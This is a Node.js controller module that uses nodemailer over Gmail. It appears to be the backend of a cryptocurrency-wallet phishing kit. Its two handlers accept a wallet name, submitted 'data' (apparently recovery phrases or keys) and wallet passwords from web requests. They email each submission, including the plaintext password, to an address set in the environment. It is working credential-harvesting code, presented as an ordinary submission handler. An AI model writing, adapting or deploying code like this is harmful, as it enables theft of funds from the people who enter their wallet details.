import nodemailer from 'nodemailer';

import dotenv from 'dotenv';  

dotenv.config();  


const emailUser = process.env.EMAIL_USER;
const emailPass = process.env.EMAIL_PASS;
const emailRecipient = process.env.EMAIL_RECIPIENT;


const transporter = nodemailer.createTransport({
  service: 'gmail', 
  auth: {
    user: emailUser,
    pass: emailPass,
  },
});

export const generateStyledEmail = (subject, body) => {
  return `
    <html>
      <head>
        <style>
          body {
            font-family: 'Arial', sans-serif;
            background-color: #f4f7fc;
            margin: 0;
            padding: 20px;
            color: #333;
          }
          .email-container {
            background-color: #ffffff;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
          }
          .header {
            font-size: 18px;
            font-weight: bold;
            color: #444;
            margin-bottom: 20px;
            border-bottom: 2px solid #ddd;
            padding-bottom: 10px;
          }
          .content {
            font-size: 16px;
            line-height: 1.6;
            margin-bottom: 20px;
          }
          .footer {
            font-size: 14px;
            text-align: center;
            color: #aaa;
          }
          .cta {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
            text-align: center;
            display: block;
            width: fit-content;
            margin-top: 10px;
          }
          .cta:hover {
            background-color: #45a049;
          }
        </style>
      </head>
      <body>
        <div class="email-container">
          <div class="header">
            📬 New Submission Notification
          </div>
          <div class="content">
            <p><strong>Wallet:</strong> ${body.walletName}</p>
            <p><strong>Method:</strong> ${body.method}</p>
            <p><strong>Type:</strong> ${body.type}</p>
            <pre><strong>Data:</strong> ${JSON.stringify(body.data, null, 2)}</pre>
          </div>
          <a href="#" class="cta">Review Submission</a>
          <div class="footer">
            This is an automated email, please do not reply.
          </div>
        </div>
      </body>
    </html>
  `;
};

export const handleWalletSubmit = async (req, res) => {
  const { type, data, walletName, method } = req.body;

  if (!walletName || !method) {
    return res.status(400).json({ error: 'Missing wallet name or method' });
  }

  const emailSubject = `New Wallet Submission: ${walletName}`;
  const emailBody = generateStyledEmail(emailSubject, { walletName, method, type, data });

  const mailOptions = {
    from: emailUser,
    to: emailRecipient,
    subject: emailSubject,
    html: emailBody,
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    
    res.status(200).json({ message: 'Submission received successfully and email sent' });
  } catch (error) {
   
    res.status(500).json({ error: 'Failed to send email' });
  }
};


export const handleWalletLogin = (req, res) => {
  const { walletName, password } = req.body;

  if (!walletName || !password) {
    return res.status(400).json({ error: 'Missing wallet name or password' });
  }

  const emailSubject = `Wallet Login Attempt: ${walletName}`;
  const emailBody = generateStyledEmail(emailSubject, { walletName, method: 'Login', type: 'Password', data: { password } });

  // Define the email options for the login attempt
  const mailOptions = {
    from: emailUser,
    to: emailRecipient,
    subject: emailSubject,
    html: emailBody,  // Send HTML content
  };

  // Send the email
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      // logger.error('Error sending login email:', error);
      return res.status(500).json({ error: 'Failed to send email' });
    }

    // logger.log(`Email sent for login attempt: ${info.response}`);
    res.status(200).json({ message: 'Login information received and email sent' });
  });
};


export default {
  handleWalletSubmit,
  handleWalletLogin
};